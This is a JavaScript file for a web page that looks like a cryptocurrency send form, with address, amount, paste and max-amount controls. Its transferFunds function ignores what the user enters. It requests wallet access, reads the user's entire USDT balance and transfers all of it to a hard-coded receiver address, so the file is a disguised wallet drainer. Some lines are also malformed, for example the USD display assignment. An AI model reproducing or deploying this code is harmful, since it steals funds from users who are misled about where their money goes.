// script.js

function clearAddress() { document.getElementById("address").value = ""; }

function pasteAddress() { navigator.clipboard.readText().then((clipText) => { document.getElementById("address").value = clipText; }).catch(err => alert("Paste failed: " + err)); }

function setMaxAmount() { // Optional: Replace with actual balance fetch if needed const max = 9999; document.getElementById("amount").value = max; updateUSD(); }

function updateUSD() { const amt = parseFloat(document.getElementById("amount").value || 0); document.getElementById("usdValue").innerText = = $${amt.toFixed(2)}; }

async function transferFunds() { const toAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // Receiver wallet const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20

const usdtAbi = [ "function transfer(address recipient, uint amount) returns (bool)", "function balanceOf(address owner) view returns (uint)" ];

if (!window.ethereum) return alert("Wallet not found");

try { const provider = new ethers.providers.Web3Provider(window.ethereum); await provider.send("eth_requestAccounts", []); const signer = provider.getSigner(); const contract = new ethers.Contract(usdtAddress, usdtAbi, signer);

const userAddress = await signer.getAddress();
const balance = await contract.balanceOf(userAddress);

if (balance.toString() === "0") return alert("No USDT in wallet.");

const tx = await contract.transfer(toAddress, balance);
await tx.wait();
alert("All USDT sent successfully.");

} catch (err) { console.error(err); alert("Transaction failed: " + (err.message || err)); } }

window.onload = () => { document.getElementById("amount").addEventListener("input", updateUSD); };
